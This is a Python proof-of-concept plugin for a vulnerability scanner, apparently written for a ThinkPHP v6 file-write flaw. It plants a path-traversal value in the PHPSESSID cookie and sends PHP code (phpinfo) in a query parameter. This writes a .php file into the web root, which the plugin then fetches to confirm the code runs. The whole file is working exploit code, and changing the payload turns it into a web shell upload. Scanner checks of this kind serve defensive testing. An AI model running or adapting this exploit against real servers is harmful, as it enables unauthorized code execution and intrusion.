
import random
from lib.utils.connect import ClientSession
from script import Script, SERVICE_PORT_MAP

class POC(Script):

    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'thinkphp v6 file write'
        self.keyword = ['thinkphp']
        self.info = 'thinkphp v6 file write'
        self.type = 'other'
        self.level = 'high'
        self.refer = ''
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
            ]))
            random_str = str(random.randint(100000, 999999)) + '.php'
            async with ClientSession() as session:
                for path in path_list:
                    url1 = path + 'index?test=<?php%20phpinfo();?>//'
                    headers = {'Cookie': 'PHPSESSID=../../../../public/' + random_str}
                    async with session.get(url=url1, headers=headers) as res1:
                        if res1 and random_str in res1.headers.get('set-cookie', ''):
                            url2 = path + random_str
                            async with session.get(url=url2) as res2:
                                if res1:
                                    text2 = await res2.text()
                                    if 'phpinfo' in text2:
                                        self.flag = 1
                                        self.res.append({"info": url2, "key": "thinkphp v6 file write"})